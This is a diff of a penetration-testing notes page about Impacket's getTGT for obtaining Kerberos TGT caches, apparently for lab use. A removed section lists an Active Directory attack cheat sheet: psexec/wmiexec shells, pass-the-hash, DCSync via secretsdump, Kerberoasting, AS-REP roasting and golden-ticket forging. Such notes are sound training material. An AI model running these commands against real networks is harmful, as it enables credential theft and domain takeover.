@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/gettgt.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Obtain and select a TGT cache
+[Search this tool’s saved examples](/commands/notebook?tool=gettgt) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Obtain and select a TGT cache
 
 **Run in:** Kali with MIT Kerberos utilities. **Requires:** A supported account credential, correct realm/DC and the actual cache filename printed by getTGT.
 
@@ -23,74 +31,9 @@ export KRB5CCNAME="$PWD/USER.ccache"
 klist
 ```
 
-**Read the result:** Confirm the cache contains a TGT for the intended principal/realm and note its expiry.
-
-**If The cache exists but no valid TGT appears:** A TGT is not a service ticket. The supplied password, NT hash or AES key must match the mechanism and account.
+**What the result establishes:** Confirm the cache contains a TGT for the intended principal/realm and note its expiry.
 
 **Next check:** Confirm the generated filename, principal and expiry, then use a Kerberos-aware service client with the matching hostname.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## getTGT.py: choose the operation and read the result
-
-Request a Kerberos TGT using known credentials.
-
-### What the result establishes
-
-Confirm the cache contains a TGT for the intended principal/realm and note its expiry.
-
-### Prerequisites and common failures
-
-A TGT is not a service ticket. The supplied password, NT hash or AES key must match the mechanism and account.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-impacket-getTGT 'DOMAIN/USER:PASSWORD'
-export KRB5CCNAME=USER.ccache
-```
-
-### Example 2: Original captured examples
-
-Run in: **Saved lab example**.
-
-```bash
-# remote execution (need admin creds or hash)
-psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
-wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
-smbexec.py / atexec.py / dcomexec.py        # alternatives
-# credentials
-secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
-GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
-GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
-# tickets
-getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
-ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
-# shares / lookups
-smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
-```
-
-Saved context: [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Request a Kerberos TGT using known credentials.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=gettgt) · [All tools](/index)
 
 ## Commands
 
@@ -101,7 +44,11 @@ impacket-getTGT 'DOMAIN/USER:PASSWORD'
 export KRB5CCNAME=USER.ccache
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The cache exists but no valid TGT appears | A TGT is not a service ticket. The supplied password, NT hash or AES key must match the mechanism and account. |
 
 ## Notebook recipes
 
@@ -133,7 +80,7 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+**Original note sections:** [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -161,21 +108,21 @@ klist
 
 </Accordion>
 
-<Accordion title="Impacket: Script Quick Reference">
+<Accordion title="Obtain and inspect a ticket">
 
-### Impacket: Script Quick Reference
+### Obtain and inspect a ticket
 
-**Impacket: Script Quick Reference**
+**Kerberos when NTLM is unavailable**
 
-Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py ,  getST.py Kerberos tools
-
-```text
-getTGT.py
+```bash
+impacket-getTGT 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP
+export KRB5CCNAME='/absolute/path/USERNAME.ccache'
+klist
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+**Original note sections:** [Kerberos when NTLM is unavailable — Obtain and inspect a ticket](/field/ntlm-disabled#obtain-and-inspect-a-ticket)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -184,6 +131,10 @@ getTGT.py
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -191,5 +142,3 @@ getTGT.py
 - [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
